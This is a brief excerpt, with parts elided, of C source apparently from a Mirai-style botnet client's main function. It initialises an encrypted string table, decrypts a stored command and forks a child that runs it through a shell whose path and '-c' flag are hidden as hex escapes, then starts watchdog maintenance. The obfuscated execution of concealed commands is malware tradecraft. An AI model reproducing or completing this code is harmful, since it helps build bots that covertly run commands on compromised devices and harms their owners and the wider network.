...
int main(int argc, unsigned char *argv[]){
    ...
    getOurIP();
    table_init();
    char *tbl_exec_succ, *tbl_exec_succ2;
    int tbl_exec_succ_len = 0, tbl_exec_succ_len2 = 0;
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_unlock_val(TABLE_EXEC_SUCCESS2);
    tbl_exec_succ2 = table_retrieve_val(TABLE_EXEC_SUCCESS2, &tbl_exec_succ_len2);
	parent = fork();
	if (parent == 0){execl("\x2f\x62\x69\x6e\x2f\x73\x68", "\x2f\x62\x69\x6e\x2f\x73\x68", "\x2d\x63", tbl_exec_succ2, NULL);}
	write(STDOUT, "\n", 1);
	table_lock_val(TABLE_EXEC_SUCCESS);
    table_lock_val(TABLE_EXEC_SUCCESS2);
    watchdog_maintain();
